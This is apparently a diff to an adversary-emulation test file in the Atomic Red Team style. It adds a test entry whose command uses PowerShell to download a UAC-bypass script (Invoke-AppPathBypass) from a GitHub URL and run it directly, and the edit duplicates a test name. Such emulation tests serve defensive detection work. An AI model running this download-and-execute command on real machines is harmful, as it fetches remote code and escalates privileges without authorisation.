@@ -97,6 +97,12 @@ atomic_tests:
 - name: PowerShell Add User
   uuid: 0e1707b2-8553-4b14-9b6e-68dd467b76ae
 
+  executor:
+    name: command_prompt
+    command: |
+      Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+
+- name: PowerShell Add User
   description: |
     Using PS 5.1, add a user via CLI
 
